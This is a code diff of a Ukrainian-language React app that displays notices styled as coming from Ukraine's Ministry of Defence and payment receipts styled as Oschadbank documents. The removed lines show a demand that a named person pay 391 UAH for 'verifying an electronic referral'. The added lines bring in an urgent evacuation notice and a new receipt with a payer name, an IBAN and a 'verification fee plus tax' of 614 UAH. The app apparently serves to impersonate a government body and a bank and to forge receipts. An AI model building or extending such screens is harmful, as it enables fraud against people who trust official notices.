@@ -295,12 +295,15 @@
                             {/* Оновлене системне сповіщення (зелене) */}
                             {showNotification && (
                                 <div className="notification-overlay">
-                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-green-600 shadow-2xl overflow-y-auto max-h-[85vh]">
+                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-green-600 shadow-2xl overflow-y-auto max-h-[85vh] relative">
+                                        <button onClick={() => setShowNotification(false)} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 z-10">
+                                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+                                        </button>
                                         <h3 className="w-full text-center text-xl font-black uppercase italic text-green-600 border-b pb-3 mb-4">Системне сповіщення</h3>
                                         <div className="space-y-4 text-[13px] leading-relaxed text-gray-700">
                                             <p className="font-black text-black text-base">{shortName}</p>
-                                            <p className="font-bold">Максим Олександрович повідомляємо Вам про те що, Вам необхідно зараз сплтити 391 грн. 00 коп. за верефікацію електронного направлення в єдиній електронній системі ЄДР "ОБЕРІГ".</p>
-                                            <p>З повагою,<br/>Міністерство оборони України</p>
+                                            <p className="font-bold text-lg text-red-600">НЕЗАБАРОМ ВІДБУДЕТЬСЯ ВАША ЕВАКУАЦІЯ</p>
+                                            <p className="font-black text-base">ОЧІКУЙТЕ БУДЬ ЛАСКА НА ЕВАКУАЦІЙНИЙ ВИЇЗД ДО КП «ДОКЛПД» ДОР</p>
                                         </div>
                                         <button onClick={() => setShowNotification(false)} className="w-full bg-black text-white py-4 rounded-2xl font-black uppercase mt-6 italic shadow-lg">ЗРОЗУМІЛО</button>
                                     </div>
@@ -310,14 +313,17 @@
                             {/* Оновлене повідомлення від Міноборони (при вході та перевірці сплат) */}
                             {showDefenseModal && (
                                 <div className="notification-overlay">
-                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-green-600 shadow-2xl overflow-y-auto max-h-[85vh]">
+                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-green-600 shadow-2xl overflow-y-auto max-h-[85vh] relative">
+                                         <button onClick={() => { setShowDefenseModal(false); setView('home'); }} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 z-10">
+                                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+                                        </button>
                                         <h3 className="w-full text-center text-xl font-black uppercase italic text-green-600 border-b pb-3 mb-4">МІНІСТЕРСТВО ОБОРОНИ УКРАЇНИ</h3>
                                         <div className="space-y-4 text-[13px] leading-relaxed text-gray-700">
                                             <p className="font-black text-black text-base">{shortName}</p>
-                                            <p className="font-bold">Максим Олександрович повідомляємо Вам про те що, Вам необхідно зараз сплтити 391 грн. 00 коп. за верефікацію електронного направлення в єдиній електронній системі ЄДР "ОБЕРІГ".</p>
-                                            <p>З повагою,<br/>Міністерство оборони України</p>
+                                            <p className="font-bold text-lg text-red-600">НЕЗАБАРОМ ВІДБУДЕТЬСЯ ВАША ЕВАКУАЦІЯ</p>
+                                            <p className="font-black text-base">ОЧІКУЙТЕ БУДЬ ЛАСКА НА ЕВАКУАЦІЙНИЙ ВИЇЗД ДО КП «ДОКЛПД» ДОР</p>
                                         </div>
-                                        <button onClick={() => setShowDefenseModal(false)} className="w-full bg-green-600 text-white py-4 rounded-2xl font-black uppercase italic shadow-lg active:scale-95 transition-all mt-6">ЗРОЗУМІЛО</button>
+                                        <button onClick={() => { setShowDefenseModal(false); setView('home'); }} className="w-full bg-green-600 text-white py-4 rounded-2xl font-black uppercase italic shadow-lg active:scale-95 transition-all mt-6">ЗРОЗУМІЛО, ПЕРЕЙТИ В КАБІНЕТ</button>
                                     </div>
                                 </div>
                             )}
@@ -509,6 +515,13 @@
                                     <p className="text-lg font-black mt-2">1 202,00 ₴</p>
                                 </div>
 
+                                {/* Нова квитанція з фото IMG_3784.jpeg */}
+                                <div className="glass-card p-6 border-l-8 border-amber-700 cursor-pointer" onClick={() => setView('receipt_img3')}>
+                                    <h4 className="font-black italic uppercase">Квитанція №205629572572</h4>
+                                    <p className="text-xs text-gray-400 uppercase font-bold">Верифікація е-квитка + податок</p>
+                                    <p className="text-lg font-black mt-2">614,00 ₴</p>
+                                </div>
+
                                 <button onClick={() => setView('home')} className="back-btn">Повернутись назад</button>
                             </div>
                         </div>
@@ -591,6 +604,55 @@
                                             <p className="text-base font-black">980,50 + 221,50</p>
                                             <p className="nr-label mt-1">СПИСАНО:</p>
                                             <p className="text-2xl font-black italic">1 202,00 UAH</p>
+                                        </div>
+                                        <div className="nr-stamp">
+                                            <div>ОЩАД 24/7</div>
+                                            <div style={{fontSize:'6px', borderTop:'1px solid #004a32', margin:'2px 0', width:'80%'}}>ДЛЯ ДОВІДОК</div>
+                                            <div>ЕЛ. ЧЕК</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <button onClick={() => setView('receipt_menu')} className="back-btn !mt-6">Повернутись до списку</button>
+                            </div>
+                        </div>
+                    )}
+
+                    {/* Детальний перегляд нової квитанції з фото IMG_3784.jpeg */}
+                    {view === 'receipt_img3' && (
+                        <div className="doc-overlay bg-white">
+                            <Header title="Квитанція №205629572572" />
+                            <div className="p-4">
+                                <div className="nr-card shadow-xl">
+                                    <div className="nr-header">ОЩАДБАНК</div>
+                                    <div className="nr-sub">МІЙ БАНК. МОЯ КРАЇНА</div>
+                                    <div className="p-4 border-b">
+                                        <p className="text-center font-black uppercase text-sm">НА IBAN З КАРТКОВОГО РАХУНКУ</p>
+                                    </div>
+                                    <div className="nr-grid">
+                                        <div><p className="nr-label">Дата операції:</p><p className="nr-val">17:02:2026 23:47:01</p></div>
+                                        <div><p className="nr-label">Статус:</p><p className="nr-val text-green-700">Виконано</p></div>
+                                        <div><p className="nr-label">Номер посилання:</p><p className="nr-val">205629572572</p></div>
+                                        <div><p className="nr-label">Через:</p><p className="nr-val">Дія.Gateway</p></div>
+                                        <div><p className="nr-label">Платник:</p><p className="nr-val">ХОХОЛЄВ К.В.</p></div>
+                                        <div><p className="nr-label">Рахунок:</p><p className="nr-val">4148********0123</p></div>
+                                        <div><p className="nr-label">Отримувач:</p><p className="nr-val text-[10px]">МИНІСТЕРСТВО ОБОРОНИ УКРАЇНИ</p></div>
+                                        <div><p className="nr-label">IBAN:</p><p className="nr-val text-[9px]">U+A828201720000002610008440196</p></div>
+                                        <div><p className="nr-label">ЄДРПОУ:</p><p className="nr-val">00034022</p></div>
+                                    </div>
+                                    <div className="nr-purpose">
+                                        <p className="font-bold mb-1">Призначення:</p>
+                                        Сплата адміністративного сбору за верифікацію електронного квитка № 145/2/23-25. Та додаткова плата податкового сбору в розмірі 145грн
+                                    </div>
+                                     <div className="px-4 py-2 text-[10px] font-mono border-t border-b border-dashed border-gray-300 bg-gray-50">
+                                        <p>Термінал: POS-784512 | Банк-емітент: Ощадбанк</p>
+                                        <p className="mt-1">Цифровий підпис: A1B2C3D4E5F6</p>
+                                    </div>
+                                    <div className="nr-footer">
+                                        <div>
+                                            <p className="nr-label">Сума + комісія + податок:</p>
+                                            <p className="text-sm font-black">391 + 145 + 78</p>
+                                            <p className="nr-label mt-1">СПИСАНО:</p>
+                                            <p className="text-2xl font-black italic">614 UAH</p>
                                         </div>
                                         <div className="nr-stamp">
                                             <div>ОЩАД 24/7</div>
